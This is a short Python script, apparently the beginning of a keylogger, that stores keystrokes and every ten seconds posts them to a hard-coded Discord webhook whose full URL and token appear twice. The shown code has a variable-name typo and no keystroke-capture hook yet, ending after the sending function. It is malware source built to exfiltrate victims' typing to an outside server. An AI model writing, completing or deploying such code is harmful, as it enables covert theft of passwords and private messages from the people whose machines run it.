# https://discord.com/api/webhooks/1371313544997638255/WC2NEkdKH20uN5zKkY4B036DF5XPrvxPZ1gLgYWsXimh1sJ169er7EJlFh13di891OPP

import keyboard
import time 
import requests
import threading

WEBHOOK_URL = "https://discord.com/api/webhooks/1371313544997638255/WC2NEkdKH20uN5zKkY4B036DF5XPrvxPZ1gLgYWsXimh1sJ169er7EJlFh13di891OPP"

keylogs = []

def send_keylogs():
    global keylogs

    if keylogs:
        keylogs_str = "\n".join(keylogs)

        peyload = {
            "content": keylogs_str
        }

        requests.post(WEBHOOK_URL, data=payload)

        keylogs = []
    threading.Timer(10, send_keylogs).start()
